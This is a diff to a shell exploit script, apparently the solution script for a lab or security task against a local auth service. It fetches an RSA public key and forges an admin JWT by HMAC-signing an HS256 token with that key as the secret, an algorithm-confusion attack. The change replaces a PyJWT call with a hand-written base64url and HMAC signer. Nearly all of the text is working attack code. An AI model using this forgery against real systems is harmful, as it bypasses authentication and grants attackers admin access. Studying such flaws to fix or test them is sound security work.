@@ -15,26 +15,35 @@ done
 curl -sf http://localhost:5000/public-key -o /tmp/pub_key.pem
 echo "Retrieved public key."
 
-# Step 2: Forge an admin JWT signed with HS256 using the public key as the HMAC secret
-# This exploits the algorithm confusion vulnerability in auth.py:
-#   _verify_hmac_compat() uses the RSA public key PEM as the HMAC-SHA256 secret.
+# Step 2: Forge an admin JWT signed with HS256 using the public key as the HMAC secret.
+# auth.py's _verify_hmac_compat verifies HS256 tokens by computing HMAC-SHA256 with
+# the RSA public key PEM as the secret — so signing the same way produces a valid token.
 python3 - <<'PYEOF'
-import jwt
+import base64
+import hashlib
+import hmac
+import json
 import time
 
-with open("/tmp/pub_key.pem") as f:
-    pub_key_pem = f.read()
 
-now = int(time.time())
-forged_payload = {
+def b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+
+with open("/tmp/pub_key.pem") as f:
+    key_bytes = f.read().encode("utf-8")
+
+header = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
+payload = b64url(json.dumps({
     "sub": "attacker",
     "role": "admin",
-    "iat": now,
+    "iat": int(time.time()),
     "iss": "auth-service-v2",
-}
+}).encode())
 
-# Sign with HS256 using the RSA public key PEM as the HMAC secret
-forged_token = jwt.encode(forged_payload, pub_key_pem, algorithm="HS256")
+signing_input = f"{header}.{payload}".encode("utf-8")
+sig = b64url(hmac.new(key_bytes, signing_input, hashlib.sha256).digest())
+forged_token = f"{header}.{payload}.{sig}"
 
 with open("/tmp/forged_token.txt", "w") as f:
     f.write(forged_token)
